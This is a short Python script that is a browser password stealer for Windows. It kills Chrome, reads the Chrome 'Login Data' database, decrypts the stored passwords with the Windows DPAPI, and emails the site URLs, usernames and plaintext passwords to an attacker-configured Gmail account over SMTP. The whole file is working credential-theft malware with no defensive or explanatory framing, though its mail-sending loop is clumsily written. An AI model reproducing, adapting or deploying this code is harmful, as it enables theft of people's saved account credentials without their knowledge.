import os
import requests
from sys import exit
import sqlite3
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from win32crypt import CryptUnprotectData
import argparse
import webbrowser

fromaddr = "yourmail.com"
toaddr = "yourmail.com"
mypass = "yourpasswors"

msg = MIMEMultipart()
msg['From'] = fromaddr
msg['To'] = toaddr

os.system("taskkill /im chrome.exe /f")

def chromepath():
    PathName = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\'
    if (os.path.isdir(PathName) == False):
        exit(0)
    return PathName

def grub():
    secret = []
    path = chromepath()
    try:
        connection = sqlite3.connect(path + "Login Data")
        with connection:
            cursor = connection.cursor()
            v = cursor.execute('SELECT action_url, username_value, password_value FROM logins')
            value = v.fetchall()

        for i in value:
            password = CryptUnprotectData(i[2], None, None, None, 0)[1]
            if password:
                secret.append({
                    '1': i[0],
                    '2': i[1],
                    '3': str(password)
                })

    except sqlite3.OperationalError as e:
            if (str(e) == 'database is locked'):
                os.system("taskkill /im chrome.exe /f")
                exit(0)
            else:
                exit(0)

    if secret == []:
    	pass
    else:
    	return secret


for data in grub():
    for x in data.values():
        msg['Subject'] = "PassForm"
        body = x + '\n'
        msg.attach(MIMEText(body, 'plain'))
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(fromaddr, mypass)
        text = msg.as_string()

server.sendmail(fromaddr, toaddr, text)
server.quit()
